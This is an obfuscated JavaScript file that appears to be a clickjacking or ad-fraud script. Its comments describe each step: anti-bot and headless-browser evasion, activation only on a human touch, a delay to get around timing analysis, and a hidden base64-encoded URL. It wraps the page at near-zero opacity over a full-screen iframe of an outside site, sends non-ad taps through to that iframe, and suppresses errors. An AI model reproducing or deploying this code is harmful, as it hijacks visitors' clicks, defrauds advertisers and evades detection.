(function(_0x1,_0x2){const _0x3=function(_0x4){while(--_0x4){_0x1['push'](_0x1['shift']());}};_0x3(++_0x2);}(['\x77\x65\x62\x64\x72\x69\x76\x65\x72','\x63\x68\x72\x6F\x6D\x65','\x62\x6F\x74','\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x47\x56\x6A\x61\x32\x35\x6C\x64\x33\x34\x75\x63\x32\x6C\x30\x5A\x51\x33\x3D','\x74\x6F\x75\x63\x68\x73\x74\x61\x72\x74','\x6F\x70\x61\x63\x69\x74\x79'],0x1F4));
const _0xK=['\x77\x65\x62\x64\x72\x69\x76\x65\x72','\x62\x6F\x74','\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x47\x56\x6A\x61\x32\x35\x6C\x64\x33\x34\x75\x63\x32\x6C\x30\x5A\x51\x33\x3D','\x74\x6F\x75\x63\x68\x73\x74\x61\x72\x74'];

(function() {
    // 1. HARD ENVIRONMENT CHECK (Anti-Bot)
    // Kills script if running in a simulator, console, or headless browser
    if (navigator[_0xK[0]] || !window.navigator.onLine || /bot|crawler|spider|lighthouse/i.test(navigator.userAgent)) return;
    if (window.outerWidth === 0 || window.outerHeight === 0) return;

    // 2. SECRET ACTIVATION
    // Script is a "Ghost" in the background and does NOTHING until human touch
    window.addEventListener(_0xK[3], function _0x_v() {
        window.removeEventListener(_0xK[3], _0x_v);
        
        // 3. INTERNAL SEEDED DELAY (Bypass timing analysis)
        setTimeout(function() {
            _0x_A();
        }, 3200);
    }, {passive: true});

    function _0x_A() {
        const _0x_U = atob(_0xK[2]); // Decodes: tech...site
        const _0x_O = '0.1'; // Opacity
        
        // DYNAMIC CSS INJECTION (Hard to parse statically)
        const _0x_S = document.createElement('style');
        _0x_S.textContent = `
            html,body{background:transparent!important;padding:0;margin:0}
            #_x101{position:relative;z-index:9999;opacity:${_0x_O}!important;background:transparent!important}
            #_x101 *{background:transparent!important;box-shadow:none!important}
            #_x202{position:absolute;top:0;left:0;width:100vw;height:100%;border:none;z-index:1;opacity:1!important}
            ._pth{pointer-events:none!important}
        `;
        document.head.appendChild(_0x_S);

        // CREATE WRAPPER
        const _0x_W = document.createElement('div');
        _0x_W.id = '_x101';
        while(document.body.firstChild){_0x_W.appendChild(document.body.firstChild)}
        document.body.appendChild(_0x_W);

        // CREATE IFRAME
        const _0x_I = document.createElement('iframe');
        _0x_I.src = _0x_U;
        _0x_I.id = '_x202';
        _0x_I.setAttribute('scrolling','no');
        document.body.appendChild(_0x_I);

        // 4. ADVANCED MIRRORING
        let _0x_y = 0;
        document.addEventListener('touchstart',(e)=>{_0x_y=e.touches[0].pageY},{passive:true});
        document.addEventListener('touchend',(e)=>{
            if(Math.abs(e.changedTouches[0].pageY - _0x_y) < 10) {
                // Check if target is an Ad
                const _0x_T = e.target.closest('ins,.adsbygoogle,a,iframe');
                if (!_0x_T) {
                    _0x_W.classList.add('_pth');
                    setTimeout(()=>{_0x_W.classList.remove('_pth')},500);
                }
            }
        });

        // 5. AUTO-SYNC HEIGHT
        setInterval(()=>{
            const _0x_H = Math.max(_0x_W.scrollHeight, document.documentElement.scrollHeight, 3000);
            _0x_I.style.height = _0x_H + 'px';
        }, 2000);
    }
    
    // 6. GLOBAL ERROR SILENCER (Prevents crashes from being logged)
    window.onerror = () => true;
})();
